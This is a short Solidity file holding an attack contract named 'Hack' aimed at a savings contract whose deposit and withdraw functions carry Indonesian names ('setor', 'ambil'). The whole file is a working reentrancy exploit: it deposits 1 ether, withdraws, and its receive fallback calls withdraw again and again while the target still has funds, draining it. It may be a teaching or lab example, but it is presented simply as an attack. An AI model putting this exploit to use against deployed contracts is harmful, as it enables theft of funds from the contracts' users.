// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITabungan {
    function setor() external payable;
    function ambil() external;
}

contract Hack{
    ITabungan private immutable target;

    constructor(address _target){
        target = ITabungan(_target);
    }

    function attack() external payable{
        target.setor{value: 1e18}();
        target.ambil();
    }

    receive() external payable {
        uint amount = min(1e18, address(target).balance);
        if(amount > 0){
            target.ambil();
        }
    }

    function min(uint x, uint y) public pure returns (uint){
        return x <= y ? x : y;
    }

    function depo() public payable{}
}